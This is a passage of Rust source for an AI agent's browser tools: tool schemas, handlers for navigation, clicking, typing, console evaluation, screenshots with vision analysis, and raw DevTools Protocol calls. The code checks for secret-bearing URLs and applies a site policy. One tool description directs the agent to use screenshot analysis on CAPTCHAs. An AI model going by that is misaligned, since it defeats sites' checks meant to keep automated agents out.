use std::env;
use std::ffi::OsString;
use std::fs::{self, File};
use std::net::TcpStream;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::thread;
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

use serde_json::{Value, json};
use serde_yaml::Value as YamlValue;
use tungstenite::stream::MaybeTlsStream;
use tungstenite::{Message, WebSocket, connect};
use url::Url;

use crate::tools::{ToolRuntime, tool_result};
use crate::vision::{classify_vision_error, run_vision_analysis};
use crate::web::{
    BLOCKED_URL_SECRET_ERROR, INVALID_URL_ERROR, check_website_access, contains_embedded_secret,
    parse_http_url,
};

const DEFAULT_COMMAND_TIMEOUT_SECS: u64 = 30;
const NAVIGATE_COMMAND_TIMEOUT_SECS: u64 = 60;
const IDLE_TIMEOUT_MS: u64 = 30 * 60 * 1000;
const SNAPSHOT_TRUNCATE_CHARS: usize = 8_000;
const SCROLL_PIXELS: u64 = 500;
const DEFAULT_CDP_TIMEOUT_SECS: u64 = 30;
const MAX_CDP_TIMEOUT_SECS: u64 = 300;

pub fn browser_available() -> bool {
    find_agent_browser_command().is_ok()
}

pub fn browser_cdp_available() -> bool {
    configured_cdp_url(&default_hermes_home()).is_some()
}

pub fn browser_navigate_schema() -> Value {
    json!({
        "name": "browser_navigate",
        "description": "Navigate to a URL in the browser. Initializes the session and loads the page. Must be called before other browser tools. For simple information retrieval, prefer web_search or web_extract because they are faster and cheaper. Use browser tools when you need to interact with a live page. Returns a compact page snapshot with interactive element refs, so a separate browser_snapshot call is usually not needed right after navigation.",
        "parameters": {
            "type": "object",
            "properties": {
                "url": {
                    "type": "string",
                    "description": "The http or https URL to open"
                }
            },
            "required": ["url"]
        }
    })
}

pub fn browser_snapshot_schema() -> Value {
    json!({
        "name": "browser_snapshot",
        "description": "Get a text-based accessibility snapshot of the current page. full=false returns a compact interactive view. full=true returns a fuller snapshot. Large snapshots are truncated.",
        "parameters": {
            "type": "object",
            "properties": {
                "full": {
                    "type": "boolean",
                    "default": false,
                    "description": "Return the full page snapshot instead of compact mode"
                }
            },
            "required": []
        }
    })
}

pub fn browser_click_schema() -> Value {
    json!({
        "name": "browser_click",
        "description": "Click an element by ref ID from browser_snapshot, such as @e5.",
        "parameters": {
            "type": "object",
            "properties": {
                "ref": {
                    "type": "string",
                    "description": "Element reference such as @e5"
                }
            },
            "required": ["ref"]
        }
    })
}

pub fn browser_type_schema() -> Value {
    json!({
        "name": "browser_type",
        "description": "Clear an input and type text into it by ref ID from browser_snapshot.",
        "parameters": {
            "type": "object",
            "properties": {
                "ref": {
                    "type": "string",
                    "description": "Element reference such as @e3"
                },
                "text": {
                    "type": "string",
                    "description": "Text to type into the target field"
                }
            },
            "required": ["ref", "text"]
        }
    })
}

pub fn browser_scroll_schema() -> Value {
    json!({
        "name": "browser_scroll",
        "description": "Scroll the current page up or down to reveal more content.",
        "parameters": {
            "type": "object",
            "properties": {
                "direction": {
                    "type": "string",
                    "enum": ["up", "down"],
                    "description": "Scroll direction"
                }
            },
            "required": ["direction"]
        }
    })
}

pub fn browser_back_schema() -> Value {
    json!({
        "name": "browser_back",
        "description": "Navigate back in browser history.",
        "parameters": {
            "type": "object",
            "properties": {},
            "required": []
        }
    })
}

pub fn browser_press_schema() -> Value {
    json!({
        "name": "browser_press",
        "description": "Press a keyboard key in the active browser page, such as Enter or Tab.",
        "parameters": {
            "type": "object",
            "properties": {
                "key": {
                    "type": "string",
                    "description": "Key to press"
                }
            },
            "required": ["key"]
        }
    })
}

pub fn browser_get_images_schema() -> Value {
    json!({
        "name": "browser_get_images",
        "description": "List non-data-page images from the current page with src, alt text, and dimensions.",
        "parameters": {
            "type": "object",
            "properties": {},
            "required": []
        }
    })
}

pub fn browser_console_schema() -> Value {
    json!({
        "name": "browser_console",
        "description": "Read browser console messages and JavaScript errors from the current page. When expression is provided, evaluate JavaScript in the page context and return the result.",
        "parameters": {
            "type": "object",
            "properties": {
                "clear": {
                    "type": "boolean",
                    "default": false,
                    "description": "Clear message buffers after reading"
                },
                "expression": {
                    "type": "string",
                    "description": "JavaScript expression to evaluate in the page context"
                }
            },
            "required": []
        }
    })
}

pub fn browser_vision_schema() -> Value {
    json!({
        "name": "browser_vision",
        "description": "Take a screenshot of the current browser page and analyze it with the configured vision model. Use this for CAPTCHAs, visual layouts, rendered charts, or any page state that the text snapshot does not capture well.",
        "parameters": {
            "type": "object",
            "properties": {
                "question": {
                    "type": "string",
                    "description": "What you want to know about the page visually"
                },
                "annotate": {
                    "type": "boolean",
                    "default": false,
                    "description": "Overlay numbered labels on interactive elements when the browser backend supports it"
                }
            },
            "required": ["question"]
        }
    })
}

pub fn browser_cdp_schema() -> Value {
    json!({
        "name": "browser_cdp",
        "description": "Send a raw Chrome DevTools Protocol command to a configured CDP endpoint. Use this as an escape hatch for low-level browser operations not covered by the main browser tools, such as Browser or Target methods, cookie inspection, or targeted Runtime/Page calls. Requires BROWSER_CDP_URL or browser.cdp_url in config.yaml.",
        "parameters": {
            "type": "object",
            "properties": {
                "method": {
                    "type": "string",
                    "description": "CDP method name such as Target.getTargets or Runtime.evaluate"
                },
                "params": {
                    "type": "object",
                    "description": "Method-specific parameters as a JSON object",
                    "properties": {},
                    "additionalProperties": true
                },
                "target_id": {
                    "type": "string",
                    "description": "Optional target or tab id. When provided, the tool first attaches to that target and sends the method on the resulting session."
                },
                "frame_id": {
                    "type": "string",
                    "description": "Reserved for future supervisor-based iframe routing. Not yet supported in the Rust runtime."
                },
                "timeout": {
                    "type": "number",
                    "default": 30,
                    "description": "Timeout in seconds for the CDP call. Clamped to 1-300."
                }
            },
            "required": ["method"]
        }
    })
}

pub fn browser_dialog_schema() -> Value {
    json!({
        "name": "browser_dialog",
        "description": "Respond to a blocking native JavaScript dialog through a CDP-capable browser connection. This sends Page.handleJavaScriptDialog to the current page target. Use action='accept' or action='dismiss'. prompt_text is only used for prompt dialogs. When multiple page targets exist, pass target_id to disambiguate.",
        "parameters": {
            "type": "object",
            "properties": {
                "action": {
                    "type": "string",
                    "enum": ["accept", "dismiss"],
                    "description": "Whether to accept or dismiss the active browser dialog."
                },
                "prompt_text": {
                    "type": "string",
                    "description": "Optional response string for prompt dialogs."
                },
                "dialog_id": {
                    "type": "string",
                    "description": "Reserved for future supervisor-backed dialog queues. Not supported in the Rust runtime yet."
                },
                "target_id": {
                    "type": "string",
                    "description": "Optional CDP target or tab id. Required when the configured browser endpoint has multiple page targets."
                },
                "timeout": {
                    "type": "number",
                    "default": 30,
                    "description": "Timeout in seconds for discovery and the dialog response call. Clamped to 1-300."
                }
            },
            "required": ["action"]
        }
    })
}

pub fn handle_browser_navigate(args: &Value, runtime: &ToolRuntime) -> String {
    let url = match required_non_empty_string(args, "url") {
        Ok(value) => value,
        Err(error) => return browser_error(error),
    };

    if contains_secret_like_url(&url) {
        return browser_error(BLOCKED_URL_SECRET_ERROR);
    }

    let parsed = match parse_http_url(&url) {
        Ok(parsed) => parsed,
        Err(_) => return browser_error(INVALID_URL_ERROR),
    };

    if let Some(blocked) = check_website_access(&parsed, runtime) {
        return tool_result(json!({
            "success": false,
            "error": format!(
                "Blocked by website policy for host '{}' (rule: {})",
                blocked.host, blocked.rule
            ),
            "blocked_by_policy": {
                "host": blocked.host,
                "rule": blocked.rule,
                "source": blocked.source,
            }
        }));
    }

    let opened = match run_browser_command(
        runtime,
        "open",
        &[url.as_str()],
        NAVIGATE_COMMAND_TIMEOUT_SECS,
    ) {
        Ok(value) => value,
        Err(error) => return browser_error(error),
    };
    if !command_success(&opened) {
        return browser_error(command_error(&opened));
    }

    let title = command_data(&opened)
        .get("title")
        .and_then(Value::as_str)
        .unwrap_or_default()
        .to_string();
    let final_url = command_data(&opened)
        .get("url")
        .and_then(Value::as_str)
        .unwrap_or(url.as_str())
        .to_string();

    let mut response = json!({
        "success": true,
        "url": final_url,
        "title": title,
    });

    if let Ok(snapshot) =
        run_browser_command(runtime, "snapshot", &["-c"], DEFAULT_COMMAND_TIMEOUT_SECS)
        && command_success(&snapshot)
    {
        let snapshot_text = command_data(&snapshot)
            .get("snapshot")
            .and_then(Value::as_str)
            .unwrap_or_default();
        let refs = command_data(&snapshot)
            .get("refs")
            .and_then(Value::as_object)
            .map(|value| value.len())
            .unwrap_or(0);
        if let Some(object) = response.as_object_mut() {
            object.insert(
                "snapshot".to_string(),
                Value::String(truncate_snapshot(snapshot_text)),
            );
            object.insert("element_count".to_string(), json!(refs));
        }
    }

    tool_result(response)
}

pub fn handle_browser_snapshot(args: &Value, runtime: &ToolRuntime) -> String {
    let full = match optional_bool(args, "full") {
        Ok(value) => value.unwrap_or(false),
        Err(error) => return browser_error(error),
    };

    let command_args = if full { Vec::new() } else { vec!["-c"] };
    let snapshot = match run_browser_command(
        runtime,
        "snapshot",
        &command_args,
        DEFAULT_COMMAND_TIMEOUT_SECS,
    ) {
        Ok(value) => value,
        Err(error) => return browser_error(error),
    };
    if !command_success(&snapshot) {
        return browser_error(command_error(&snapshot));
    }

    let snapshot_text = command_data(&snapshot)
        .get("snapshot")
        .and_then(Value::as_str)
        .unwrap_or_default();
    let element_count = command_data(&snapshot)
        .get("refs")
        .and_then(Value::as_object)
        .map(|value| value.len())
        .unwrap_or(0);

    tool_result(json!({
        "success": true,
        "snapshot": truncate_snapshot(snapshot_text),
        "element_count": element_count,
    }))
}

pub fn handle_browser_click(args: &Value, runtime: &ToolRuntime) -> String {
    let reference = match required_non_empty_string(args, "ref") {
        Ok(value) => normalize_ref(&value),
        Err(error) => return browser_error(error),
    };
    let result = match run_browser_command(
        runtime,
        "click",
        &[reference.as_str()],
        DEFAULT_COMMAND_TIMEOUT_SECS,
    ) {
        Ok(value) => value,
        Err(error) => return browser_error(error),
    };
    if !command_success(&result) {
        return browser_error(command_error(&result));
    }
    tool_result(json!({
        "success": true,
        "clicked": reference,
    }))
}

pub fn handle_browser_type(args: &Value, runtime: &ToolRuntime) -> String {
    let reference = match required_non_empty_string(args, "ref") {
        Ok(value) => normalize_ref(&value),
        Err(error) => return browser_error(error),
    };
    let text = match string_arg(args, "text") {
        Ok(value) => value,
        Err(error) => return browser_error(error),
    };
    let result = match run_browser_command(
        runtime,
        "fill",
        &[reference.as_str(), text.as_str()],
        DEFAULT_COMMAND_TIMEOUT_SECS,
    ) {
        Ok(value) => value,
        Err(error) => return browser_error(error),
    };
    if !command_success(&result) {
        return browser_error(command_error(&result));
    }
    tool_result(json!({
        "success": true,
        "typed": text,
        "element": reference,
    }))
}

pub fn handle_browser_scroll(args: &Value, runtime: &ToolRuntime) -> String {
    let direction = match required_non_empty_string(args, "direction") {
        Ok(value) => value,
        Err(error) => return browser_error(error),
    };
    if !matches!(direction.as_str(), "up" | "down") {
        return browser_error("Invalid direction. Use 'up' or 'down'.");
    }
    let pixels = SCROLL_PIXELS.to_string();
    let result = match run_browser_command(
        runtime,
        "scroll",
        &[direction.as_str(), pixels.as_str()],
        DEFAULT_COMMAND_TIMEOUT_SECS,
    ) {
        Ok(value) => value,
        Err(error) => return browser_error(error),
    };
    if !command_success(&result) {
        return browser_error(command_error(&result));
    }
    tool_result(json!({
        "success": true,
        "scrolled": direction,
    }))
}

pub fn handle_browser_back(_args: &Value, runtime: &ToolRuntime) -> String {
    let result = match run_browser_command(runtime, "back", &[], DEFAULT_COMMAND_TIMEOUT_SECS) {
        Ok(value) => value,
        Err(error) => return browser_error(error),
    };
    if !command_success(&result) {
        return browser_error(command_error(&result));
    }
    tool_result(json!({
        "success": true,
        "url": command_data(&result)
            .get("url")
            .and_then(Value::as_str)
            .unwrap_or_default(),
    }))
}

pub fn handle_browser_press(args: &Value, runtime: &ToolRuntime) -> String {
    let key = match required_non_empty_string(args, "key") {
        Ok(value) => value,
        Err(error) => return browser_error(error),
    };
    let result = match run_browser_command(
        runtime,
        "press",
        &[key.as_str()],
        DEFAULT_COMMAND_TIMEOUT_SECS,
    ) {
        Ok(value) => value,
        Err(error) => return browser_error(error),
    };
    if !command_success(&result) {
        return browser_error(command_error(&result));
    }
    tool_result(json!({
        "success": true,
        "pressed": key,
    }))
}

pub fn handle_browser_console(args: &Value, runtime: &ToolRuntime) -> String {
    let clear = match optional_bool(args, "clear") {
        Ok(value) => value.unwrap_or(false),
        Err(error) => return browser_error(error),
    };
    let expression = match optional_non_empty_string(args, "expression") {
        Ok(value) => value,
        Err(error) => return browser_error(error),
    };

    if let Some(expression) = expression {
        return handle_browser_eval(runtime, &expression);
    }

    let mut console_args = Vec::new();
    if clear {
        console_args.push("--clear");
    }
    let console = match run_browser_command(
        runtime,
        "console",
        &console_args,
        DEFAULT_COMMAND_TIMEOUT_SECS,
    ) {
        Ok(value) => value,
        Err(error) => return browser_error(error),
    };
    if !command_success(&console) {
        return browser_error(command_error(&console));
    }

    let errors = match run_browser_command(
        runtime,
        "errors",
        &console_args,
        DEFAULT_COMMAND_TIMEOUT_SECS,
    ) {
        Ok(value) => value,
        Err(error) => return browser_error(error),
    };
    if !command_success(&errors) {
        return browser_error(command_error(&errors));
    }

    let console_messages = command_data(&console)
        .get("messages")
        .and_then(Value::as_array)
        .cloned()
        .unwrap_or_default()
        .into_iter()
        .map(|message| {
            json!({
                "type": message.get("type").and_then(Value::as_str).unwrap_or("log"),
                "text": message.get("text").and_then(Value::as_str).unwrap_or_default(),
                "source": "console",
            })
        })
        .collect::<Vec<_>>();

    let js_errors = command_data(&errors)
        .get("errors")
        .and_then(Value::as_array)
        .cloned()
        .unwrap_or_default()
        .into_iter()
        .map(|item| {
            json!({
                "message": item.get("message").and_then(Value::as_str).unwrap_or_default(),
                "source": "exception",
            })
        })
        .collect::<Vec<_>>();

    tool_result(json!({
        "success": true,
        "console_messages": console_messages,
        "js_errors": js_errors,
        "total_messages": console_messages.len(),
        "total_errors": js_errors.len(),
    }))
}

pub fn handle_browser_get_images(_args: &Value, runtime: &ToolRuntime) -> String {
    let js = r#"JSON.stringify(
        [...document.images].map(img => ({
            src: img.src,
            alt: img.alt || '',
            width: img.naturalWidth,
            height: img.naturalHeight
        })).filter(img => img.src && !img.src.startsWith('data:'))
    )"#;
    let result = match run_browser_command(runtime, "eval", &[js], DEFAULT_COMMAND_TIMEOUT_SECS) {
        Ok(value) => value,
        Err(error) => return browser_error(error),
    };
    if !command_success(&result) {
        return browser_error(command_error(&result));
    }

    let parsed = parse_browser_eval_result(command_data(&result).get("result"));
    let images = match parsed {
        Value::Array(items) => items,
        Value::Null => Vec::new(),
        _ => return browser_error("browser_get_images returned an unexpected result"),
    };

    tool_result(json!({
        "success": true,
        "images": images,
        "count": images.len(),
    }))
}

pub fn handle_browser_vision(args: &Value, runtime: &ToolRuntime) -> String {
    let question = match required_non_empty_string(args, "question") {
        Ok(value) => value,
        Err(error) => return browser_error(error),
    };
    let annotate = match optional_bool(args, "annotate") {
        Ok(value) => value.unwrap_or(false),
        Err(error) => return browser_error(error),
    };

    let screenshots_dir = runtime.hermes_home().join("cache/screenshots");
    if let Err(error) = fs::create_dir_all(&screenshots_dir) {
        return browser_error(format!(
            "creating screenshot directory {} failed: {error}",
            screenshots_dir.display()
        ));
    }
    cleanup_old_screenshots(&screenshots_dir, Duration::from_secs(24 * 60 * 60));

    let mut screenshot_path =
        screenshots_dir.join(format!("browser_screenshot_{:x}.png", unix_ts_nanos()));
    let screenshot_path_text = screenshot_path.display().to_string();
    let mut command_args = Vec::new();
    if annotate {
        command_args.push("--annotate");
    }
    command_args.push("--full");
    command_args.push(screenshot_path_text.as_str());

    let result = match run_browser_command(
        runtime,
        "screenshot",
        &command_args,
        NAVIGATE_COMMAND_TIMEOUT_SECS,
    ) {
        Ok(value) => value,
        Err(error) => return browser_error(format!("Failed to take screenshot: {error}")),
    };
    if !command_success(&result) {
        return browser_error(format!(
            "Failed to take screenshot: {}",
            command_error(&result)
        ));
    }

    if let Some(actual_path) = command_data(&result)
        .get("path")
        .and_then(Value::as_str)
        .filter(|value| !value.trim().is_empty())
    {
        screenshot_path = PathBuf::from(actual_path);
    }

    if !screenshot_path.is_file() {
        return browser_error(format!(
            "Screenshot file was not created at {}. This may indicate a missing Chromium install or a stale browser session.",
            screenshot_path.display()
        ));
    }

    match run_vision_analysis(&screenshot_path.display().to_string(), &question, runtime) {
        Ok(analysis) => {
            let mut response = json!({
                "success": true,
                "analysis": analysis,
                "screenshot_path": screenshot_path.display().to_string(),
            });
            if annotate
                && let Some(annotations) = command_data(&result).get("annotations").cloned()
                && let Some(object) = response.as_object_mut()
            {
                object.insert("annotations".to_string(), annotations);
            }
            tool_result(response)
        }
        Err(error) => {
            let mut payload = classify_vision_error(error);
            if let Some(object) = payload.as_object_mut() {
                object.insert(
                    "screenshot_path".to_string(),
                    Value::String(screenshot_path.display().to_string()),
                );
                if annotate
                    && let Some(annotations) = command_data(&result).get("annotations").cloned()
                {
                    object.insert("annotations".to_string(), annotations);
                }
            }
            tool_result(payload)
        }
    }
}

pub fn handle_browser_cdp(args: &Value, runtime: &ToolRuntime) -> String {
    let method = match required_non_empty_string(args, "method") {
        Ok(value) => value,
        Err(error) => return browser_error(error),
    };
    let params = match args.get("params") {
        None | Some(Value::Null) => serde_json::Map::new(),
        Some(Value::Object(map)) => map.clone(),
        Some(_) => return browser_error("params must be an object"),
    };
    let target_id = match optional_non_empty_string(args, "target_id") {
        Ok(value) => value,
        Err(error) => return browser_error(error),
    };
    let frame_id = match optional_non_empty_string(args, "frame_id") {
        Ok(value) => value,
        Err(error) => return browser_error(error),
    };
    if frame_id.is_some() {
        return browser_error(
            "frame_id routing is not ported in the Rust runtime yet. Use target_id with a top-level tab or omit frame_id.",
        );
    }
    let timeout_secs = match optional_timeout_seconds(args, "timeout") {
        Ok(value) => value.unwrap_or(DEFAULT_CDP_TIMEOUT_SECS),
        Err(error) => return browser_error(error),
    };

    let endpoint =
        normalize_cdp_endpoint(&configured_cdp_url(runtime.hermes_home()).unwrap_or_default());
    let endpoint = match endpoint {
        Some(value) => value,
        None => {
            return browser_error(
                "No CDP endpoint is configured. Set BROWSER_CDP_URL or browser.cdp_url in config.yaml.",
            );
        }
    };
    if !endpoint.starts_with("ws://") && !endpoint.starts_with("wss://") {
        return browser_error(format!(
            "Configured CDP endpoint is not a WebSocket URL: {endpoint}"
        ));
    }

    let result = match run_cdp_call(
        &endpoint,
        &method,
        Value::Object(params.clone()),
        target_id.as_deref(),
        timeout_secs,
    ) {
        Ok(value) => value,
        Err(error) => return browser_error(error),
    };

    let mut payload = json!({
        "success": true,
        "method": method,
        "result": result,
    });
    if let Some(target_id) = target_id
        && let Some(object) = payload.as_object_mut()
    {
        object.insert("target_id".to_string(), Value::String(target_id));
    }
    tool_result(payload)
}

pub fn handle_browser_dialog(args: &Value, runtime: &ToolRuntime) -> String {
    let action = match required_non_empty_string(args, "action") {
        Ok(value) => value,
        Err(error) => return browser_error(error),
    };
    let accept = match action.as_str() {
        "accept" => true,
        "dismiss" => false,
        _ => return browser_error("Invalid action. Use 'accept' or 'dismiss'."),
    };
    let prompt_text = match optional_non_empty_string(args, "prompt_text") {
        Ok(value) => value.unwrap_or_default(),
        Err(error) => return browser_error(error),
    };
    let dialog_id = match optional_non_empty_string(args, "dialog_id") {
        Ok(value) => value,
        Err(error) => return browser_error(error),
    };
    if dialog_id.is_some() {
        return browser_error(
            "dialog_id routing is not ported in the Rust runtime yet. Omit dialog_id and use target_id when multiple page targets are open.",
        );
    }
    let target_id = match optional_non_empty_string(args, "target_id") {
        Ok(value) => value,
        Err(error) => return browser_error(error),
    };
    let timeout_secs = match optional_timeout_seconds(args, "timeout") {
        Ok(value) => value.unwrap_or(DEFAULT_CDP_TIMEOUT_SECS),
        Err(error) => return browser_error(error),
    };

    let endpoint =
        normalize_cdp_endpoint(&configured_cdp_url(runtime.hermes_home()).unwrap_or_default());
    let endpoint = match endpoint {
        Some(value) => value,
        None => {
            return browser_error(
                "No CDP endpoint is configured. Set BROWSER_CDP_URL or browser.cdp_url in config.yaml.",
            );
        }
    };
    if !endpoint.starts_with("ws://") && !endpoint.starts_with("wss://") {
        return browser_error(format!(
            "Configured CDP endpoint is not a WebSocket URL: {endpoint}"
        ));
    }

    let resolved_target = if let Some(target_id) = target_id.as_deref() {
        Some(target_id.to_string())
    } else if endpoint.to_ascii_lowercase().contains("/devtools/browser/") {
        match infer_default_page_target_id(&endpoint, timeout_secs) {
            Ok(value) => Some(value),
            Err(error) => return browser_error(error),
        }
    } else {
        None
    };

    let result = match run_cdp_call(
        &endpoint,
        "Page.handleJavaScriptDialog",
        json!({
            "accept": accept,
            "promptText": prompt_text,
        }),
        resolved_target.as_deref(),
        timeout_secs,
    ) {
        Ok(value) => value,
        Err(error) => return browser_error(error),
    };

    let mut payload = json!({
        "success": true,
        "action": action,
        "result": result,
    });
    if let Some(target_id) = resolved_target
        && let Some(object) = payload.as_object_mut()
    {
        object.insert("target_id".to_string(), Value::String(target_id));
    }
    tool_result(payload)
}

fn handle_browser_eval(runtime: &ToolRuntime, expression: &str) -> String {
    let result =
        match run_browser_command(runtime, "eval", &[expression], DEFAULT_COMMAND_TIMEOUT_SECS) {
            Ok(value) => value,
            Err(error) => return browser_error(error),
        };
    if !command_success(&result) {
        return browser_error(command_error(&result));
    }
    let parsed = parse_browser_eval_result(command_data(&result).get("result"));
    tool_result(json!({
        "success": true,
        "result": parsed,
        "result_type": json_type_name(&parsed),
    }))
}

fn configured_cdp_url(hermes_home: &Path) -> Option<String> {
    env::var("BROWSER_CDP_URL")
        .ok()
        .map(|value| value.trim().to_string())
        .filter(|value| !value.is_empty())
        .or_else(|| configured_cdp_url_from_file(hermes_home))
}

fn configured_cdp_url_from_file(hermes_home: &Path) -> Option<String> {
    let path = hermes_home.join("config.yaml");
    let contents = fs::read_to_string(path).ok()?;
    let parsed = serde_yaml::from_str::<YamlValue>(&contents).ok()?;
    parsed
        .as_mapping()?
        .get(YamlValue::String("browser".to_string()))?
        .as_mapping()?
        .get(YamlValue::String("cdp_url".to_string()))?
        .as_str()
        .map(str::trim)
        .filter(|value| !value.is_empty())
        .map(ToOwned::to_owned)
}

fn normalize_cdp_endpoint(raw: &str) -> Option<String> {
    let trimmed = raw.trim();
    if trimmed.is_empty() {
        return None;
    }

    let parsed = Url::parse(trimmed).ok()?;
    match parsed.scheme() {
        "ws" | "wss" => {
            let lowercase = trimmed.to_ascii_lowercase();
            if lowercase.contains("/devtools/browser/") {
                return Some(trimmed.to_string());
            }
            if parsed.path().is_empty() || parsed.path() == "/" {
                return resolve_cdp_discovery_endpoint(&parsed)
                    .or_else(|| Some(trimmed.to_string()));
            }
            Some(trimmed.to_string())
        }
        "http" | "https" => {
            resolve_cdp_discovery_endpoint(&parsed).or_else(|| Some(trimmed.to_string()))
        }
        _ => Some(trimmed.to_string()),
    }
}

fn resolve_cdp_discovery_endpoint(discovery_url: &Url) -> Option<String> {
    let mut version_url = discovery_url.clone();
    match version_url.scheme() {
        "ws" => {
            let _ = version_url.set_scheme("http");
        }
        "wss" => {
            let _ = version_url.set_scheme("https");
        }
        _ => {}
    }
    if !version_url.path().ends_with("/json/version") {
        version_url.set_path("/json/version");
        version_url.set_query(None);
    }
    let response = reqwest::blocking::Client::builder()
        .timeout(Duration::from_secs(10))
        .build()
        .ok()?
        .get(version_url.as_str())
        .send()
        .ok()?;
    let body = response.json::<Value>().ok()?;
    body.get("webSocketDebuggerUrl")
        .and_then(Value::as_str)
        .map(str::trim)
        .filter(|value| !value.is_empty())
        .map(ToOwned::to_owned)
}

fn run_cdp_call(
    endpoint: &str,
    method: &str,
    params: Value,
    target_id: Option<&str>,
    timeout_secs: u64,
) -> Result<Value, String> {
    let _ = Url::parse(endpoint).map_err(|error| format!("Invalid CDP endpoint: {error}"))?;
    let (mut socket, _) =
        connect(endpoint).map_err(|error| format!("Connecting to CDP endpoint failed: {error}"))?;
    set_cdp_timeouts(&mut socket, Duration::from_secs(timeout_secs.max(1)));

    let mut next_id = 1_i64;
    let mut session_id = None::<String>;

    if let Some(target_id) = target_id {
        let attach_id = next_id;
        next_id += 1;
        socket
            .send(Message::Text(
                json!({
                    "id": attach_id,
                    "method": "Target.attachToTarget",
                    "params": {
                        "targetId": target_id,
                        "flatten": true,
                    }
                })
                .to_string()
                .into(),
            ))
            .map_err(|error| format!("Sending Target.attachToTarget failed: {error}"))?;
        loop {
            let message = read_cdp_message(&mut socket)?;
            if message.get("id").and_then(Value::as_i64) != Some(attach_id) {
                continue;
            }
            if let Some(error) = message.get("error") {
                return Err(format!("Target.attachToTarget failed: {error}"));
            }
            let Some(value) = message
                .get("result")
                .and_then(|result| result.get("sessionId"))
                .and_then(Value::as_str)
            else {
                return Err("Target.attachToTarget did not return a sessionId".to_string());
            };
            session_id = Some(value.to_string());
            break;
        }
    }

    let call_id = next_id;
    let mut request = json!({
        "id": call_id,
        "method": method,
        "params": params,
    });
    if let Some(session_id) = session_id
        && let Some(object) = request.as_object_mut()
    {
        object.insert("sessionId".to_string(), Value::String(session_id));
    }
    socket
        .send(Message::Text(request.to_string().into()))
        .map_err(|error| format!("Sending CDP method {method} failed: {error}"))?;

    loop {
        let message = read_cdp_message(&mut socket)?;
        if message.get("id").and_then(Value::as_i64) != Some(call_id) {
            continue;
        }
        if let Some(error) = message.get("error") {
            return Err(format!("CDP error: {error}"));
        }
        return Ok(message.get("result").cloned().unwrap_or(Value::Null));
    }
}

fn infer_default_page_target_id(endpoint: &str, timeout_secs: u64) -> Result<String, String> {
    let result = run_cdp_call(endpoint, "Target.getTargets", json!({}), None, timeout_secs)?;
    let Some(targets) = result.get("targetInfos").and_then(Value::as_array) else {
        return Err("Target.getTargets did not return targetInfos".to_string());
    };

    let page_targets = targets
        .iter()
        .filter(|target| target.get("type").and_then(Value::as_str) == Some("page"))
        .collect::<Vec<_>>();
    if page_targets.is_empty() {
        return Err("No page targets are available on the configured CDP endpoint.".to_string());
    }
    if page_targets.len() == 1 {
        return page_targets[0]
            .get("targetId")
            .and_then(Value::as_str)
            .map(ToOwned::to_owned)
            .ok_or_else(|| "The only page target did not include targetId".to_string());
    }

    let attached = page_targets
        .iter()
        .filter(|target| {
            target
                .get("attached")
                .and_then(Value::as_bool)
                .unwrap_or(false)
        })
        .collect::<Vec<_>>();
    if attached.len() == 1 {
        return attached[0]
            .get("targetId")
            .and_then(Value::as_str)
            .map(ToOwned::to_owned)
            .ok_or_else(|| "The attached page target did not include targetId".to_string());
    }

    Err(
        "Multiple page targets are available. Use browser_dialog with target_id to select a page."
            .to_string(),
    )
}

fn read_cdp_message(socket: &mut WebSocket<MaybeTlsStream<TcpStream>>) -> Result<Value, String> {
    loop {
        let message = socket
            .read()
            .map_err(|error| format!("Reading CDP response failed: {error}"))?;
        match message {
            Message::Text(text) => {
                return serde_json::from_str(text.as_ref())
                    .map_err(|error| format!("Invalid JSON from CDP endpoint: {error}"));
            }
            Message::Binary(bytes) => {
                let text = String::from_utf8(bytes.to_vec())
                    .map_err(|error| format!("Invalid binary CDP frame: {error}"))?;
                return serde_json::from_str(&text)
                    .map_err(|error| format!("Invalid JSON from CDP endpoint: {error}"));
            }
            Message::Ping(payload) => {
                socket
                    .send(Message::Pong(payload))
                    .map_err(|error| format!("Responding to CDP ping failed: {error}"))?;
            }
            Message::Close(_) => {
                return Err("CDP connection closed before a response arrived".to_string());
            }
            _ => {}
        }
    }
}

fn set_cdp_timeouts(socket: &mut WebSocket<MaybeTlsStream<TcpStream>>, timeout: Duration) {
    match socket.get_mut() {
        MaybeTlsStream::Plain(stream) => {
            let _ = stream.set_read_timeout(Some(timeout));
            let _ = stream.set_write_timeout(Some(timeout));
        }
        MaybeTlsStream::Rustls(stream) => {
            let tcp = stream.get_mut();
            let _ = tcp.set_read_timeout(Some(timeout));
            let _ = tcp.set_write_timeout(Some(timeout));
        }
        _ => {}
    }
}

fn find_agent_browser_command() -> Result<Vec<OsString>, String> {
    if let Some(path) = find_in_path("agent-browser") {
        return Ok(vec![path.into_os_string()]);
    }

    let local = repo_root()
        .join("node_modules")
        .join(".bin")
        .join("agent-browser");
    if local.is_file() {
        return Ok(vec![local.into_os_string()]);
    }

    if find_in_path("npx").is_some() {
        return Ok(vec![OsString::from("npx"), OsString::from("agent-browser")]);
    }

    Err(
        "agent-browser CLI not found. Install it with `npm install -g agent-browser && agent-browser install`, or run `npm install` in the repo root."
            .to_string(),
    )
}

fn run_browser_command(
    runtime: &ToolRuntime,
    command: &str,
    args: &[&str],
    timeout_secs: u64,
) -> Result<Value, String> {
    let command_prefix = find_agent_browser_command()?;
    let session_name = browser_session_name(runtime);
    let socket_dir = std::env::temp_dir().join(format!("agent-browser-{session_name}"));
    fs::create_dir_all(&socket_dir).map_err(|error| {
        format!(
            "creating browser socket directory {} failed: {error}",
            socket_dir.display()
        )
    })?;

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let _ = fs::set_permissions(&socket_dir, fs::Permissions::from_mode(0o700));
    }

    let stdout_path = socket_dir.join(format!("stdout-{command}-{}", unix_ts_nanos()));
    let stderr_path = socket_dir.join(format!("stderr-{command}-{}", unix_ts_nanos()));
    let stdout_file = File::create(&stdout_path)
        .map_err(|error| format!("creating {} failed: {error}", stdout_path.display()))?;
    let stderr_file = File::create(&stderr_path)
        .map_err(|error| format!("creating {} failed: {error}", stderr_path.display()))?;

    let mut process = Command::new(&command_prefix[0]);
    process.args(&command_prefix[1..]);
    process
        .arg("--session")
        .arg(&session_name)
        .arg("--json")
        .arg(command)
        .args(args)
        .current_dir(runtime.cwd())
        .stdin(Stdio::null())
        .stdout(Stdio::from(stdout_file))
        .stderr(Stdio::from(stderr_file));

    let mut command_path = env::var_os("PATH").unwrap_or_default();
    let local_bin = repo_root().join("node_modules").join(".bin");
    if local_bin.is_dir() {
